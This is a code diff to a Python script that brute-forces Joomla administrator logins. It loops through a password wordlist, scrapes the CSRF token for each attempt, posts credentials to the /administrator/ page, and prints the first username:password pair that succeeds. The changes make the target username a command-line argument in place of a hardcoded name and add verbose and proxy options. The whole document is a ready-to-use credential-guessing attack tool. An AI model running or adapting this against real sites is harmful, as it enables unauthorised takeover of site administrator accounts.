@@ -24,9 +24,11 @@ class Joomla():
         #required
         parser.add_argument('-u', '--url', required=True, type=str, help='Joomla site')
         parser.add_argument('-w', '--wordlist', required=True, type=str, help='Path to wordlist file')
+        parser.add_argument('-usr', '--username', required=True, type=str, help='One single username')
         #optional
-        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional.')
-
+        parser.add_argument('-p', '--proxy', type=str, help='Specify proxy. Optional. http://127.0.0.1:8080')
+        parser.add_argument('-v', '--verbose', action='store_true', help='Shows output. Not default.')
+        
         args = parser.parse_args()
         #parse args and save proxy
         if args.proxy:
@@ -34,6 +36,12 @@ class Joomla():
             self.proxy = { parsedproxyurl[0] : parsedproxyurl[1] }
         else:
             self.proxy=None
+        
+        #determine if verbose or not
+        if args.verbose:
+            self.verbose=True
+        else:
+            self.verbose=False
         
         #http:/site/administrator
         self.url = args.url+'/administrator/'
@@ -44,12 +52,13 @@ class Joomla():
         self.cookies = requests.session().get(self.url).cookies.get_dict()
         #Wordlist from args
         self.wordlist = args.wordlist
+        self.username = args.username
 
         with open(self.wordlist, 'rb+') as f:
             passwords = ([line.rstrip() for line in f])
             f.close()
+            
         for password in passwords:
-            username = 'Floris'
             #first get for cssrf token
             r = requests.get(self.url, proxies=self.proxy, cookies=self.cookies)
             soup = BeautifulSoup(r.text, 'html.parser')
@@ -57,7 +66,7 @@ class Joomla():
 
             password=password.decode('utf-8')
             data = {
-                'username' : username,
+                'username' : self.username,
                 'passwd' : password,
                 'option' : self.option,
                 'task' : self.task,
@@ -69,9 +78,10 @@ class Joomla():
             response = soup.find('div', {'class': 'alert-message'})
  
             if response:
-                print(f'{bcolors.FAIL} {username}:{password}{bcolors.ENDC}')
+                if self.verbose:
+                    print(f'{bcolors.FAIL} {self.username}:{password}{bcolors.ENDC}')
             else:
-                print(f'{bcolors.OKGREEN} {username}:{password}{bcolors.ENDC}')
+                print(f'{bcolors.OKGREEN} {self.username}:{password}{bcolors.ENDC}')
                 break
 
 joomla = Joomla()
